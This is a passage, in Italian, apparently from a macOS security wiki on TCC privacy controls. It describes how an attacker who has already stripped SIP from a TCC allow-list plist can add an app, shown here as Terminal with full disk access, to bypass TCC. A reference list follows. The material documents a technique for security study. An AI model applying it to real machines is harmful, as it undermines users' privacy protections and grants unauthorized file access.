Tuttavia, c'è un'altra opzione per abusare di questo **SIP bypass per bypassare TCC**: il file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` è un'allow list delle applicazioni che richiedono un'eccezione TCC. Pertanto, se un attacker riesce a **rimuovere la protezione SIP** da questo file e ad aggiungere la **propria applicazione**, quest'ultima potrà bypassare TCC.\
Per esempio, per aggiungere Terminale:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### Bypass di TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Un'analisi approfondita di macOS TCC.db - Blog di Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script per tracciare com.apple.macl (Gist di brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Tracciare e gestire com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Elusione delle protezioni della privacy di macOS TCC, per caso e per scelta](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Modificare la home directory ed eludere TCC, aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection in TCC: e perché (probabilmente) questa volta non è stato un rischio per la sicurezza](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Posizione e acquisizione di TCC.db su macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Configurare l'App Sandbox di macOS](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Entitlement della fotocamera](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Impostazioni del payload di gestione dei dispositivi Privacy Preferences Policy Control per i dispositivi Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Analisi di un'intrusione in macOS, dall'esca alla compromissione](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
